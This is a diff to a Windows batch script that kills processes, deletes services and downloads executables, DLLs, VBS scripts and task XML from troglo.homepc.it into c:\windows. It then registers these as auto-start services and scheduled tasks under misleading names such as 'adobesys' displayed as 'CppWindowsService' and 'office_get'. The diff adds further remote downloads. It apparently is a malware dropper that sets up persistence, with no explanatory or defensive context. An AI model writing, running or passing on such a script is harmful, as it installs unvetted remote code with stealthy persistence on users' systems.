@@ -3,7 +3,12 @@ taskkill /f /im sys2.exe
 taskkill /f /im sys3.exe
 sc delete CppWindowsService
 sc delete adobesys
+wget http://troglo.homepc.it/win/CppWindowsService.xml -O c:\windows\CppWindowsService.xml
+wget http://troglo.homepc.it/win/adobesys.xml -O c:\windows\adobesys.xml
 wget http://troglo.homepc.it/win/sys3.dll -O c:\windows\sys3.dll
+copy /Y c:\windows\sys3.dll c:\windows\sys3t.dll
+wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
+copy /Y c:\windows\sys2.dll c:\windows\sys2t.dll
 wget http://troglo.homepc.it/win/office_get.xml -O c:\windows\office_get.xml
 wget http://troglo.homepc.it/win/get.vbs -O c:\windows\get.vbs
 schtasks /delete /tn office_get /F
@@ -16,7 +21,6 @@ wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
 wget http://troglo.homepc.it/win/sys3.exe -O c:\windows\sys3.exe
 sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
 sc create adobesys binPath= c:\windows\sys3.exe DisplayName= "CppWindowsService" start= auto
-wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
 wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\svc.vbs
 wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
 wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
